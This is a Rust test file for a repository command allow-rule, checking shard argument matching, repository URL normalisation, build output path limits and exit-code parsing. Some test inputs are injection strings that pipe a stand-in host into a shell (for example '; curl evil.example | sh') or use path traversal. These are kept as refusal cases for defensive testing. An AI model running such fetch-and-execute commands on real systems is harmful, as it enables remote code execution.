use nuee_exec::{RepoRule, shard_argv, shard_exit_code};
use nuee_proto::{BoundedString, BoundedVec, EnvVar, ExecSpec};

const REPO: &str = "https://example.org/team/app.git";

fn spec(repo: &str, argv: Vec<String>) -> ExecSpec {
    ExecSpec {
        repo: BoundedString::try_from(repo).unwrap(),
        rev: BoundedString::try_from("a".repeat(40)).unwrap(),
        argv: BoundedVec::try_from(
            argv.into_iter()
                .map(|a| BoundedString::try_from(a).unwrap())
                .collect::<Vec<_>>(),
        )
        .unwrap(),
        env: BoundedVec::new(),
        timeout_s: 60,
        gpu: false,
    }
}

fn rule() -> RepoRule {
    RepoRule::new(REPO, "npm test -- --shard={i}/{n}").unwrap()
}

#[test]
fn any_commit_runs_the_allowed_command_with_numbers() {
    assert!(rule().matches(&spec(REPO, shard_argv("npm test -- --shard=3/8"))));
}

#[test]
fn placeholders_only_ever_stand_for_digits() {
    for command in [
        "npm test -- --shard=x/8",
        "npm test -- --shard=/8",
        "npm test -- --shard=1/8; curl evil.example | sh",
        "npm test -- --shard=$(curl evil.example)/8",
        "curl evil.example; npm test -- --shard=1/8",
    ] {
        assert!(
            !rule().matches(&spec(REPO, shard_argv(command))),
            "{command}"
        );
    }
}

#[test]
fn another_repository_is_refused() {
    let other = "https://example.org/team/other.git";
    assert!(!rule().matches(&spec(other, shard_argv("npm test -- --shard=1/8"))));
}

#[test]
fn the_same_repository_matches_however_it_was_cloned() {
    for same in [
        "https://example.org/team/app",
        "https://example.org/team/app/",
        "https://EXAMPLE.org/team/app.git",
    ] {
        assert!(
            rule().matches(&spec(same, shard_argv("npm test -- --shard=1/8"))),
            "{same}"
        );
    }
    for other in [
        "https://example.org/Team/app.git",
        "https://example.org/team/app2.git",
        "example.org/team/app.git",
    ] {
        assert!(
            !rule().matches(&spec(other, shard_argv("npm test -- --shard=1/8"))),
            "{other}"
        );
    }
}

#[test]
fn a_command_outside_the_shard_wrapper_is_refused() {
    let bare = vec!["npm".to_owned(), "test".to_owned()];
    assert!(!rule().matches(&spec(REPO, bare)));
    let mut changed = shard_argv("npm test -- --shard=1/8");
    changed[2] = "curl evil.example | sh; exit 0".to_owned();
    assert!(!rule().matches(&spec(REPO, changed)));
}

#[test]
fn an_environment_or_a_gpu_needs_a_real_approval() {
    let mut with_env = spec(REPO, shard_argv("npm test -- --shard=1/8"));
    with_env.env = BoundedVec::try_from(vec![EnvVar {
        key: BoundedString::try_from("FOO").unwrap(),
        value: BoundedString::try_from("bar").unwrap(),
    }])
    .unwrap();
    assert!(!rule().matches(&with_env));
    let mut with_gpu = spec(REPO, shard_argv("npm test -- --shard=1/8"));
    with_gpu.gpu = true;
    assert!(!rule().matches(&with_gpu));
}

#[test]
fn rules_refuse_bad_input() {
    assert!(RepoRule::new("http://example.org/a.git", "x").is_err());
    assert!(RepoRule::new(REPO, "  ").is_err());
}

#[test]
fn builds_keep_only_paths_inside_the_checkout() {
    let rule = RepoRule::new(REPO, "npm run build").expect("rule");
    let with = |kept: &[&str]| {
        let kept: Vec<String> = kept.iter().map(|k| (*k).to_owned()).collect();
        spec(REPO, nuee_exec::build_argv("npm run build", &kept))
    };
    assert!(rule.matches(&with(&[])));
    assert!(rule.matches(&with(&["dist", "out/assets"])));
    for bad in ["/etc", "../x", "a/../b", "-rf", ".", "a//b", ""] {
        assert!(!rule.matches(&with(&[bad])), "{bad:?}");
    }
    let too_many: Vec<String> = (0..=nuee_exec::MAX_KEPT).map(|i| format!("d{i}")).collect();
    assert!(!rule.matches(&spec(
        REPO,
        nuee_exec::build_argv("npm run build", &too_many)
    )));
    assert!(!rule.matches(&spec(REPO, nuee_exec::build_argv("npm run evil", &[]))));
}

#[test]
fn the_exit_code_comes_from_the_last_line_only() {
    assert_eq!(shard_exit_code(b"ok\n\nnuee-exit-code 0\n"), Some(0));
    assert_eq!(shard_exit_code(b"boom\n\nnuee-exit-code 17\n"), Some(17));
    // A test that prints the marker cannot pass itself off as successful.
    assert_eq!(
        shard_exit_code(b"nuee-exit-code 0\n\nnuee-exit-code 1\n"),
        Some(1)
    );
    assert_eq!(shard_exit_code(b"no marker\n"), None);
}
